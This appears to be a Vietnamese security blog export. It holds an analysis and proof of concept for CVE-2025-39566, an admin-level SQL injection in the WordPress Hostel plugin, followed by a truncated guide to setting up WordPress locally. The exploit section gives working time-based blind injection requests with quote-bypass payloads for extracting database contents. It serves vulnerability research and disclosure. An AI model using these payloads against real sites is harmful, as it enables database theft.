[{"content":"L·ªó h·ªïng trong plugin Hostel tr∆∞·ªõc phi√™n b·∫£n 1.1.5.7. Do vi·ªác l√†m s·∫°ch d·ªØ li·ªáu kh√¥ng ƒë√∫ng c√°ch, ƒëi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\nCVE ID: CVE-2025-39566 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.1.5.6 CVSS severity: 7.6 (High) Required Privilege: Administrator Requirements Local WordPress and Debugging Hostel Plugin: v1.1.5.6(vul) v√† v1.1.5.7(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th√°y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Analysis Nguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ GET request v√†o SQL query m√† c∆° ch·∫ø ki·ªÉm so√°t kh√¥ng ch·∫∑t ch·∫Ω.\nPatch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file controllers/bookings.php\nB·∫£n l·ªó h·ªïng:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } B·∫£n v√°:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) { $ob = sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]); if(!in_array($ob, [\u0026#39;tB.id\u0026#39;, \u0026#39;tB.contact_name\u0026#39;, \u0026#39;tB.contact_email\u0026#39;, \u0026#39;tB.from_date\u0026#39;, \u0026#39;tB.amount_paid\u0026#39;, \u0026#39;tB.status\u0026#39;])) { $ob = \u0026#39;tB.id\u0026#39;; } $orderby = \u0026#34;ORDER BY $ob $dir\u0026#34;; } üëâ B·∫£n v√° s·ª≠ d·ª•ng whitelist ƒë·ªÉ gi·ªõi h·∫°n c√°c c·ªôt c√≥ th·ªÉ ƒë∆∞·ª£c s·∫Øp x·∫øp, n·∫øu kh√¥ng h·ª£p l·ªá tr·∫£ v·ªÅ 'tB.id'.\nAnalysis: L·ªó h·ªïng xu·∫•t hi·ªán khi param ob ƒë∆∞·ª£c truy·ªÅn tr·ª±c ti·∫øp v√†o m·ªánh ƒë·ªÅ ORDER BY th√¥ng qua h√†m sanitize_text_field(), ch·ªâ escape m√† kh√¥ng filter SQLi.\nHow it work? ƒê·ªÉ inject ƒë∆∞·ª£c, ta c·∫ßn ph·∫£i x√°c ƒë·ªãnh to√†n b·ªô c√¢u query ƒë∆∞·ª£c ƒë∆∞·ª£c s·ª≠ d·ª•ng ·ªü ƒë√¢y\n$bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); C√¢u query n·∫±m trong nh√°nh default c·ªßa c·∫•u tr√∫c switch.\nTo√†n b·ªô ƒëo·∫°n x·ª≠ l√Ω na·ª≥ thu·ªôc v·ªÅ h√†m static manage() c·ªßa class WPHostelBookings.\nclass WPHostelBookings { static function manage() { global $wpdb; $_booking = new WPHostelBooking(); switch(@$_GET[\u0026#39;do\u0026#39;]) { case \u0026#39;add\u0026#39;: // add handle break; case \u0026#39;edit\u0026#39;: // edit handle break; // view/print booking details. Will allow also to confirm/cancel case \u0026#39;view\u0026#39;: // view handle\tbreak;\t// list bookings default: // another logic if(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } $bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); // another logic break; } } } Trong WordPress, plugin giao ti·∫øp v·ªõi core th√¥ng qua Plugin API (Hook System). Do ƒë√≥, ƒë·ªÉ x√°c ƒë·ªãnh n∆°i h√†m manage() ƒë∆∞·ª£c g·ªçi, ta c√≥ th·ªÉ t√¨m ki·∫øm t·ª´ kh√≥a \u0026quot;manage\u0026quot; trong th∆∞ m·ª•c ch·ª©a plugin.\nTrong file models/hostel.php ta c√≥ h√†m:\nclass class WPHostel { // another logic static function menu() { // we use \u0026#39;hostelpro_manage\u0026#39; for consistency with the pro version $wphostel_caps = current_user_can(\u0026#39;manage_options\u0026#39;) ? \u0026#39;manage_options\u0026#39; : \u0026#39;hostelpro_manage\u0026#39;; add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_rooms\u0026#39;, array(\u0026#39;WPHostelRooms\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_unavailable\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;unavailable\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_emaillog\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;email_log\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_help\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;index\u0026#34;)); } // another logic } ·ªû ƒë√¢y:\nadd_menu_page() t·∫°o menu ch√≠nh trong Admin Dashboard. add_submenu_page() th√™m c√°c submenu con cho menu ƒë√≥. Tham s·ªë $callback l√† m·ªôt callback function s·∫Ω ƒë∆∞·ª£c g·ªçi khi ng∆∞·ªùi d√πng click v√†o menu/submenu. V√≠ d·ª•:\n// add_menu_page($page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;, $icon_url = \u0026#39;\u0026#39;, $position = null); add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); // add_submenu_page($parent_slug, $page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); // array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); =\u0026gt; WPHostelBookings::manage() T·∫•t c·∫£ menu/submenu n√†y ƒë·ªÅu ƒë∆∞·ª£c ƒëƒÉng k√Ω b√™n trong h√†m static menu() c·ªßa class WPHostel. Do ƒë√≥, ƒë·ªÉ x√°c ƒë·ªãnh n∆°i h√†m menu() ƒë∆∞·ª£c g·ªçi, ta c√≥ th·ªÉ t√¨m ki·∫øm t·ª´ kh√≥a menu trong th∆∞ m·ª•c ch·ª©a plugin.\nTrong file hostel.php ·ªü th∆∞ m·ª•c g·ªëc c·ªßa plugin ta c√≥:\nadd_action(\u0026#39;admin_menu\u0026#39;, array(\u0026#34;WPHostel\u0026#34;, \u0026#34;menu\u0026#34;)); // =\u0026gt; callback: WPHostel::menu() add_action() l√† m·ªôt Plugin API c·ªßa WordPress, cho ph√©p g·∫Øn m·ªôt callback v√†o m·ªôt action hook. Hook name ·ªü ƒë√¢y l√† admin_menu, nghƒ©a l√† h√†m WPHostel::menu() s·∫Ω ƒë∆∞·ª£c g·ªçi trong v√≤ng ƒë·ªùi khi WordPress d·ª±ng Admin Dashboard Menu. Menu tr√™n UI Admin Dashboard\nDebugging\nCh·ª©c nƒÉng b·ªã l·ªói n·∫±m trong Booking Manager, v√¨ v·∫≠y ta truy c·∫≠p v√†o submenu Manager Bookings tr√™n UI Admin Dashboard. Ngay tr∆∞·ªõc nh√°nh default c√≥ comment // list bookings =\u0026gt; cho th·∫•y ƒëo·∫°n code n√†y x·ª≠ l√Ω vi·ªác li·ªát k√™ v√† s·∫Øp x·∫øp bookings M·ªü debugger: Click Run with Debugger. ƒê·∫∑t breakpoint t·∫°i nh√°nh switch ch·ª©a code l·ªói v√† t·∫°i d√≤ng code g√¢y l·ªói. Khi click v√†o m·ªôt c·ªôt trong b·∫£ng bookings, quan s√°t: Debugger nh·∫£y v√†o c·∫•u tr√∫c switch. D√πng Step Over, debugger ƒëi ti·∫øp v√†o nh√°nh default. Ti·∫øp t·ª•c Step Over v√† theo d√µi gi√° tr·ªã bi·∫øn trong tab Variables \u0026gt; Locals. C√°c bi·∫øn n√†y s·∫Ω k·∫øt h·ª£p ƒë·ªÉ t·∫°o th√†nh c√¢u SQL b√™n d∆∞·ªõi. Sau khi gh√©p c√°c bi·∫øn, c√¢u query ƒë·∫ßy ƒë·ªß c√≥ d·∫°ng:\nSELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM wp_hostel_bookings tB JOIN wp_hostel_rooms tR ON tR.id = tB.room_id WHERE is_static=0 AND tB.id = ... ORDER BY tB.amount_paid ASC|DESC LIMIT ... ƒê√°ng ch√∫ √Ω, bi·∫øn $orderby ƒë∆∞·ª£c g√°n nh∆∞ sau:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } ‚ö†Ô∏è ·ªû ƒë√¢y c√≥ ƒëi·ªÉm b·∫•t th∆∞·ªùng:\nPh·∫ßn sau ORDER BY s·ª≠ d·ª•ng sanitize_text_field(). H√†m n√†y ch·ªâ l√†m s·∫°ch HTML, kh√¥ng h·ªÅ filter ho·∫∑c validate ƒë·ªÉ ƒë·∫£m b·∫£o an to√†n trong SQL context. Tham s·ªë ob (do ng∆∞·ªùi d√πng truy·ªÅn v√†o) v√¨ v·∫≠y c√≥ th·ªÉ b·ªã l·ª£i d·ª•ng ƒë·ªÉ ch√®n tr·ª±c ti·∫øp v√†o c√¢u SQL. Exploit Detect SQLi Request with BurpSuite:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=upcoming\u0026amp;ob=tB.status,(SELECT+SLEEP(10))\u0026amp;dir=ASC HTTP/1.1 Ta t√°ch m·ªánh ƒë·ªÅ ORDER BY b·∫±ng , v√¨ n√≥ ch·∫•p nh·∫≠p multi column\nK·∫øt qu·∫£: th·ªùi gian ph·∫£n h·ªìi b·ªã delay =\u0026gt; SQL Injection th√†nh c√¥ng.\nDump Data from Database Bypass ' using ORD():\nƒê·ªÉ dump d·ªØ li·ªáu c·ªßa database ta c·∫ßn th·ª≠ ƒë·ªÉ l·∫•y k√Ω t·ª± ƒë·∫ßu ti√™n c·ªßa database name.\nDo sanitize_text_field() lo·∫°i b·ªè ', ta kh√¥ng d√πng ƒë∆∞·ª£c payload so s√°nh tr·ª±c ti·∫øp. Thay v√†o ƒë√≥ d√πng ORD() ƒë·ªÉ so s√°nh k√Ω t·ª± theo ASCII:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(ORD(SUBSTRING(DATABASE(),1,1))=119,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Th√†nh c√¥ng bypass =\u0026gt; c√≥ th·ªÉ tr√≠ch xu·∫•t t√™n database.\nBypass ' using Hex encoding (extend)\nNgo√†i ORD() ta c√≥ th·ªÉ s·ª≠ d·ª•ng Hex encoding ƒë·ªÉ bypass\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Th√†nh c√¥ng bypass =\u0026gt; c√≥ th·ªÉ tr√≠ch xu·∫•t t√™n database.\nConclusion L·ªó h·ªïng CVE-2025-39566 trong plugin WordPress Hostel tr∆∞·ªõc phi√™n b·∫£n 1.1.5.7, xu·∫•t ph√°t t·ª´ vi·ªác truy·ªÅn tr·ª±c ti·∫øp input t·ª´ ng∆∞·ªùi d√πng v√†o SQL query m√† kh√¥ng c√≥ bi·ªán ph√°p ki·ªÉm so√°t ch·∫∑t ch·∫Ω d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\nKey takeaways:\nsanitize_text_field() ‚â† ch·ªëng SQL Injection C·∫ßn ph√¢n bi·ªát r√µ: l·ªçc input cho HTML vs cho SQL References SQL Injection Cheat Sheet ‚Äì PortSwigger\nWordPress Hostel Plugin \u0026lt;= 1.1.5.6 is vulnerable to SQL Injection - patchstack\n","permalink":"//localhost:1313/vi/posts/2025-09-21-cve-2025-39566/","summary":"\u003cp\u003eL·ªó h·ªïng trong plugin \u003cstrong\u003eHostel\u003c/strong\u003e tr∆∞·ªõc phi√™n b·∫£n \u003cstrong\u003e1.1.5.7\u003c/strong\u003e. Do vi·ªác l√†m s·∫°ch d·ªØ li·ªáu kh√¥ng ƒë√∫ng c√°ch, ƒëi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39566\"\u003eCVE-2025-39566\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/hostel/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.1.5.6\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: 7.6 (High)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Administrator\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/blog/posts/2025-09-20-wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eHostel Plugin\u003c/strong\u003e:  v1.1.5.6(vul) v√† v1.1.5.7(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th√°y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eNguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ \u003cstrong\u003eGET\u003c/strong\u003e request v√†o SQL query m√† c∆° ch·∫ø ki·ªÉm so√°t kh√¥ng ch·∫∑t ch·∫Ω.\u003c/p\u003e","title":"CVE-2025-39566 Analysis \u0026 POC"},{"content":"WordPress l√† m·ªôt h·ªá th·ªëng qu·∫£n l√Ω n·ªôi dung (CMS) m·∫°nh m·∫Ω v√† ph·ªï bi·∫øn nh·∫•t cho ph√©p b·∫°n t·∫°o, qu·∫£n l√Ω v√† t√πy ch·ªânh c√°c trang web v√† blog m·ªôt c√°ch d·ªÖ d√†ng. N√≥ l√† open-source CMS, ƒë∆∞·ª£c x√¢y d·ª±ng tr√™n PHP v√† s·ª≠ d·ª•ng c∆° s·ªü d·ªØ li·ªáu MySQL ho·∫∑c Maria DB.\nRa ƒë·ªùi nƒÉm 2003, ban ƒë·∫ßu ch·ªâ ƒë·ªÉ vi·∫øt blog, sau ƒë√≥ ph√°t tri·ªÉn th√†nh n·ªÅn t·∫£ng t·∫°o website, c·ª≠a h√†ng online, di·ªÖn ƒë√†n, landing page‚Ä¶ Hi·ªán nay, h∆°n 40% website tr√™n th·∫ø gi·ªõi ch·∫°y b·∫±ng WordPress. C√≥ 2 phi√™n b·∫£n WordPress:\nWordPress.com D·ªãch v·ª• hosting do Automattic cung c·∫•p B·∫°n ch·ªâ c·∫ßn ƒëƒÉng k√Ω t√†i kho·∫£n, kh√¥ng ph·∫£i c√†i ƒë·∫∑t H·∫°n ch·∫ø t√πy ch·ªânh, mu·ªën n√¢ng cao th√¨ ph·∫£i tr·∫£ ph√≠ WordPress.org M√£ ngu·ªìn m·ªü, b·∫°n t·ª± t·∫£i v·ªÅ v√† c√†i ƒë·∫∑t l√™n hosting/server ri√™ng T√πy ch·ªânh to√†n di·ªán, c√≥ th·ªÉ c√†i plugin, theme, vi·∫øt code, t·∫°o website theo √Ω m√¨nh Ecosystem Core: CMS ch√≠nh Plugin: M·ªôt ph·∫ßn m·ªÅm b·ªï sung c√≥ th·ªÉ ƒë∆∞·ª£c c√†i ƒë·∫∑t tr√™n trang web WordPress ƒë·ªÉ m·ªü r·ªông ch·ª©c nƒÉng c·ªßa n√≥ v√† th√™m c√°c t√≠nh nƒÉng m·ªõi Themes: M·ªôt ph·∫ßn m·ªÅm b·ªï sung ƒë·∫°i di·ªán cho s·ª± xu·∫•t hi·ªán tr·ª±c quan v√† b·ªë c·ª•c c·ªßa m·ªôt trang web WordPress Why WordPress Hacking? State of WordPress Security in 2024\nMost Popular Hi·ªán t·∫°i h∆°n 40% website tr√™n to√†n th·∫ø gi·ªõi ch·∫°y WordPress Nghƒ©a l√† hacker ch·ªâ c·∫ßn t√¨m ra m·ªôt l·ªó h·ªïng ph·ªï bi·∫øn =\u0026gt; c√≥ th·ªÉ khai th√°c h√†ng tri·ªáu site c√πng l√∫c Gi·ªëng nh∆∞ ‚Äúc√° nhi·ªÅu th√¨ ch√†i ·ªü ƒë√≥‚Äù Plugin and Theme WordPress Core ƒë√£ ƒë∆∞·ª£c xem x√©t trong 1 th·ªùi gian d√†i b·ªüi h√†ng ng√†n developers v√† researchers. K·∫øt qu·∫£ l√† r·∫•t kh√≥ ƒë·ªÉ k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ ƒë·ªôt nh·∫≠p v√†o Tuy nhi√™n, c√≥ h√†ng ch·ª•c ng√†n plugin v√† theme t·ª´ nhi·ªÅu ngu·ªìn, ch·∫•t l∆∞·ª£ng kh√¥ng ƒë·ªìng ƒë·ªÅu ƒë∆∞·ª£c s·ª≠ d·ª•ng Nhi·ªÅu plugin code b·∫£o m·∫≠t k√©m, kh√¥ng c√≤n ƒë∆∞·ª£c c·∫≠p nh·∫≠t. Hacker ch·ªâ c·∫ßn scan plugin/theme ƒë·ªÉ t√¨m version l·ªói th·ªùi, r·ªìi khai th√°c Setup WordPress for Hacking C√≥ r·∫•t nhi·ªÅu c√°ch ƒë·ªÉ setup WorkPress, t√¨m ki·∫øm b·∫±ng Google c√≥ th·ªÉ cung c·∫•p nhi·ªÅu b√†i vi·∫øt v·ªÅ n√≥. ·ªû ƒë√¢y t√¥i s·∫Ω setup tr√™n m√°y ·∫£o Ubuntu (22.04):\nKh√¥ng ·∫£nh h∆∞·ªüng ƒë·∫øn c√°c d·ªãch v·ª• c·ªßa m√°y th·∫≠t WordPress t∆∞∆°ng ƒë·ªëi nh·∫π ƒë·ªÉ s·ª≠ d·ª•ng tr√™n m√°y ·∫£o Install and configure WordPress Install Dependencies C√†i to√†n b·ªô stack c·∫ßn thi·∫øt ƒë·ªÉ ch·∫°y WordPress (web server + database + PHP + c√°c extension quan tr·ªçng).\nsudo apt install apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress T·∫£i v√† c√†i m√£ ngu·ªìn WordPress v√†o th∆∞ m·ª•c web.\n# T·∫°o folder ƒë·ªÉ l∆∞u tr·ªØ m√£ ngu·ªìn website sudo mkdir -p /srv/www # ƒê·ªïi owner th√†nh www-data, ƒë√¢y l√† user m·∫∑c ƒë·ªãnh c·ªßa Apache/Nginx ƒë·ªÉ ch·∫°y web server # Khi Apache/NGINX kh·ªüi ƒë·ªông, n√≥ kh√¥ng ch·∫°y b·∫±ng root (nguy hi·ªÉm v√¨ c√≥ to√†n quy·ªÅn h·ªá th·ªëng), m√† s·∫Ω drop xu·ªëng ch·∫°y d∆∞·ªõi quy·ªÅn www-data. sudo chown www-data: /srv/www # T·∫£i g√≥i WordPress m·ªõi nh·∫•t t·ª´ trang ch√≠nh th·ª©c # Gi·∫£i n√©n vao th∆∞c m·ª•c /srv/www ƒë∆∞·ª£c t·∫°o ·ªü tr√™n curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www C√≥ th·ªÉ t·∫£i phi√™n b·∫£n c·ª• th·ªÉ b·∫±ng:\ncurl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www C√†i t·ª´ wordpress.org l√† c√°ch chu·∫©n nh·∫•t v√† √≠t r·ªßi ro:\nUbuntu c√≥ s·∫µn package wordpress trong repo. Nh∆∞ng n√≥ th∆∞·ªùng c≈© h∆°n nhi·ªÅu so v·ªõi b·∫£n ch√≠nh th·ª©c tr√™n wordpress.org C·ªông ƒë·ªìng WordPress ch·ªâ h·ªó tr·ª£ khi b·∫°n d√πng b·∫£n ch√≠nh th·ª©c t·ª´ wordpress.org, v√¨ n·∫øu b·∫°n g·∫∑p l·ªói do package c·ªßa Ubuntu th√¨ h·ªç kh√¥ng gi·∫£i quy·∫øt ƒë∆∞·ª£c. Configure Apache for WordPress T·∫°o file /etc/apache2/sites-available/wordpress.conf c·∫•u h√¨nh Apache cho WordPress:\n# L·∫Øng nghe tr√™n t·∫•t c·∫£ ƒë·ªãa ch·ªâ IP (*) t·∫°i port 80 (HTTP). \u0026lt;VirtualHost *:80\u0026gt; # Th∆∞ m·ª•c g·ªëc c·ªßa website (n∆°i ch·ª©a m√£ ngu·ªìn WordPress). DocumentRoot /srv/www/wordpress \u0026lt;Directory /srv/www/wordpress\u0026gt; Options FollowSymLinks # Cho ph√©p file .htaccess ghi ƒë√® m·ªôt s·ªë thi·∫øt l·∫≠p li√™n quan ƒë·∫øn b·∫£o m·∫≠t v√† URL rewriting. AllowOverride Limit Options FileInfo # Khi truy c·∫≠p th∆∞ m·ª•c, Apache s·∫Ω t√¨m file index.php ƒë·ªÉ hi·ªÉn th·ªã. DirectoryIndex index.php # Cho ph√©p t·∫•t c·∫£ m·ªçi ng∆∞·ªùi truy c·∫≠p (c·∫ßn cho website public). Require all granted \u0026lt;/Directory\u0026gt; # Ri√™ng th∆∞ m·ª•c wp-content (ch·ª©a plugin, theme, upload) c≈©ng cho ph√©p truy c·∫≠p. \u0026lt;Directory /srv/www/wordpress/wp-content\u0026gt; Options FollowSymLinks Require all granted \u0026lt;/Directory\u0026gt; \u0026lt;/VirtualHost\u0026gt; K√≠ch ho·∫°t site WordPress:\nsudo a2ensite wordpress a2ensite = enable site config (t·∫°o symlink t·ª´ /etc/apache2/sites-available/wordpress.conf sang /etc/apache2/sites-enabled/) Sau ƒë√≥ site wordpress s·∫Ω ƒë∆∞·ª£c Apache load khi restart. K√≠ch ho·∫°t module rewrite:\nsudo a2enmod rewrite WordPress c·∫ßn module mod_rewrite ƒë·ªÉ h·ªó tr·ª£ Pretty Permalinks (v√≠ d·ª• /blog/hello-world/ thay v√¨ ?p=123) V√¥ hi·ªáu h√≥a site m·∫∑c ƒë·ªãnh (Option):\nsudo a2dissite 000-default Apache m·∫∑c ƒë·ªãnh c√≥ site 000-default.conf (ch·ªâ hi·ªÉn th·ªã \u0026ldquo;It works!\u0026rdquo;) N·∫øu kh√¥ng disable, site m·∫∑c ƒë·ªãnh c√≥ th·ªÉ chi·∫øm port 80 tr∆∞·ªõc WordPress üëâ Ho·∫∑c n·∫øu kh√¥ng mu·ªën disable, c√≥ th·ªÉ th√™m ServerName v√†o VirtualHost WordPress ƒë·ªÉ Apache ph√¢n bi·ªát domain.\n\u0026lt;VirtualHost *:80\u0026gt; ServerName mywordpress.local DocumentRoot /srv/www/wordpress ... \u0026lt;/VirtualHost\u0026gt; Mu·ªën ch·∫°y ƒë∆∞·ª£c th√¨ ph·∫£i c·∫•u h√¨nh DNS ho·∫∑c s·ª≠a file hosts:\nLinux/Mac: /etc/hosts Windows: C:\\Windows\\System32\\drivers\\etc\\hosts Reload Apache:\nsudo service apache2 reload T·∫£i l·∫°i c·∫•u h√¨nh m·ªõi m√† kh√¥ng c·∫ßn d·ª´ng server Configure database WordPress c·∫ßn m·ªôt c∆° s·ªü d·ªØ li·ªáu (MySQL/MariaDB) ƒë·ªÉ l∆∞u:\nB√†i vi·∫øt, trang, menu Ng∆∞·ªùi d√πng, m·∫≠t kh·∫©u (hash) C·∫•u h√¨nh site Plugins, themes settings M·ªü MySQL v·ªõi quy·ªÅn root:\nsudo mysql -u root C·∫•u h√¨nh MySQL:\n-- T·∫°o database wordpress mysql\u0026gt; CREATE DATABASE wordpress; Query OK, 1 row affected (0,00 sec) -- T·∫°o user ri√™ng cho wordpress mysql\u0026gt; CREATE USER wordpress@localhost IDENTIFIED BY \u0026#39;\u0026lt;your-password\u0026gt;\u0026#39;; Query OK, 1 row affected (0,00 sec) -- C·∫•p quy·ªÅn cho user WordPress mysql\u0026gt; GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost; Query OK, 1 row affected (0,00 sec) -- L√†m m·ªõi l·∫°i quy·ªÅn mysql\u0026gt; FLUSH PRIVILEGES; Query OK, 1 row affected (0,00 sec) -- Tho√°t mysql\u0026gt; quit Bye Kh·ªüi ƒë·ªông l·∫°i d·ªãch v·ª•:\nsudo service mysql start Configure WordPress to connect to the database Copy file c·∫•u h√¨nh m·∫´u:\nsudo -u www-data cp /srv/www/wordpress/wp-config-sample.php /srv/www/wordpress/wp-config.php WordPress khi t·∫£i v·ªÅ c√≥ s·∫µn file wp-config-sample.php B·∫°n copy n√≥ th√†nh wp-config.php ƒë·ªÉ l√†m file c·∫•u h√¨nh ch√≠nh cho site Ch·ªânh s·ª≠a th√¥ng tin database:\nsudo -u www-data sed -i \u0026#39;s/database_name_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i 